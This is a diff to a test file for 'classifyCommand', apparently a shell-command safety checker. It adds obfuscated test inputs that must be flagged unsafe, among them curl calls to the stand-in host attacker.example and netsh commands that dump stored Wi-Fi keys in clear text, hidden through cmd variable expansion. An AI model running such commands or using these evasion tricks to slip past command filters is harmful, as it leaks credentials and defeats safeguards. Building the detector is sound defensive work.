@@ -659,6 +659,10 @@ describe('classifyCommand', () => {
         'C:\\Windows\\System32\\cu""rl.exe https://attacker.example/',
         'c$@url https://attacker.example/',
         '$CMD https://attacker.example/',
+        'cu%COMSPEC:~0,0%rl https://attacker.example/',
+        'ne%COMSPEC:~0,0%tsh wlan show profile corp key=clear',
+        '!X! https://attacker.example/',
+        'env %X% https://attacker.example/',
         'env $X https://attacker.example/',
         '. iwr https://attacker.example/',
       ]) {
@@ -715,10 +719,24 @@ describe('classifyCommand', () => {
         expect(classifyCommand(cmd, wl).safe, cmd).toBe(false);
       }
       // cmd variables, quoted or not.
-      for (const cmd of ['dir %USERPROFILE%', 'type "%APPDATA%\\x.txt"', 'route print %COMSPEC:~0,1%', 'ipconfig !OPT!']) {
+      for (const cmd of [
+        'dir %USERPROFILE%',
+        'type "%APPDATA%\\x.txt"',
+        'route print %COMSPEC:~0,1%',
+        'ipconfig !OPT!',
+        // Variable names that are not identifiers.
+        'netsh wlan show profile corp key=%ProgramFiles(x86):~0,1%lear',
+        'netsh wlan show profile corp %=ExitCode%',
+        'dir %A-B%',
+        'dir %X%',
+        // `+FORMAT` is exempt only for date.
+        'date %X% +%Y',
+      ]) {
         expect(classifyCommand(cmd, wl).safe, cmd).toBe(false);
       }
-      expect(classifyCommand('date +%Y%m%d', wl).safe).toBe(true);
+      for (const cmd of ['date +%Y%m%d', 'date +"%Y-%m-%d %H:%M"', "date -u '+%F %T'"]) {
+        expect(classifyCommand(cmd, wl).safe, cmd).toBe(true);
+      }
       // Single-quoted `$` is literal, and a trailing regex anchor expands nothing.
       expect(classifyCommand("grep 'x$' file.txt", wl).safe).toBe(true);
       expect(classifyCommand('grep "^a$" file.txt', wl).safe).toBe(true);
